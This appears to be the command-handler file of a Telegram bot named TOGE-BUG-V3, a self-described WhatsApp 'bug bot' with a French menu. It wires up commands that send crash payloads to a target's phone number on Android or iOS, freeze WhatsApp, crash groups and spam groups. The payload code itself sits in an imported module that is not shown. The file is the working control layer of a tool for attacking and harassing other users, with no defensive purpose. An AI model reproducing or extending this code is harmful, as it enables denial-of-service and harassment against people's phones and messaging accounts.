const { sendPayload } = require('./payloads');

module.exports.setupCommands = (bot, wa, config) => {
    // Menu avec image ou vidéo
    bot.command('menu', (ctx) => {
        ctx.replyWithPhoto({ source: 'path/to/your/image.jpg' }, {
            caption: `
            *salut ! je suis TOGE-BUG-V3 un bug bot WhatsApp développer par* @lionelmelo
📱 *COMMANDES*

🔗 Appairage : 
/paircode [numéro] *Ex: /paircode 24105114159*

💣 Commandes Spéciales :
/xandroid [cible] - Crash Android
/xios [cible] - Crash iOS
/xfreeze [cible] - Gel WhatsApp
/xbugv1 [cible] - Bug v1
/xbugv2 [cible] - Bug v2

💥 Commandes Groupes :
/crashgroup [lien] - Faire planter un groupe
/spamgroup [lien] - Spammer un groupe
            `,
            parse_mode: 'MarkdownV2'
        });
    });

    // Appairage par numéro
    bot.command('paircode', async (ctx) => {
        const phoneNumber = ctx.message.text.split(' ')[1];
        
        if(!phoneNumber) return ctx.reply('❌ Format: /paircode 24105114159');
        
        const result = await wa.pair(phoneNumber);
        result.status === 'success' 
            ? ctx.reply(`🔑 Code d'appairage : ${result.code}`)
            : ctx.reply(`❌ Erreur: ${result.message}`);
    });

    // Commandes de crash
    const createCrashCmd = (type) => async (ctx) => {
        const target = ctx.message.text.split(' ')[1];
        
        if(!target) return ctx.reply(`❌ Usage: /${type} +numéro`);
        
        try {
            await sendPayload(wa.client, target, type.toUpperCase());
            ctx.reply(`☠️ ${type} envoyé à ${target}`);
        } catch(e) {
            ctx.reply(`💥 Erreur: ${e.message}`);
        }
    };

    // Commande pour faire planter un groupe
    bot.command('crashgroup', async (ctx) => {
        const groupLink = ctx.message.text.split(' ')[1];
        
        if(!groupLink) return ctx.reply('❌ Format: /crashgroup [lien_du_groupe]');
        
        try {
            // Simuler une action qui fait planter le groupe
            await wa.crashGroup(groupLink);
            ctx.reply(`💥 Le groupe a été crashé : ${groupLink}`);
        } catch(e) {
            ctx.reply(`❌ Erreur: ${e.message}`);
        }
    });

    // Commande pour spammer un groupe
    bot.command('spamgroup', async (ctx) => {
        const groupLink = ctx.message.text.split(' ')[1];
        
        if(!groupLink) return ctx.reply('❌ Format: /spamgroup [lien_du_groupe]');
        
        try {
            // Simuler une action de spam dans le groupe
            await wa.spamGroup(groupLink);
            ctx.reply(`📢 Spam envoyé dans le groupe : ${groupLink}`);
        } catch(e) {
            ctx.reply(`❌ Erreur: ${e.message}`);
        }
    });

    config.PREMIUM_CMDS.forEach(cmd => bot.command(cmd, createCrashCmd(cmd)));
};
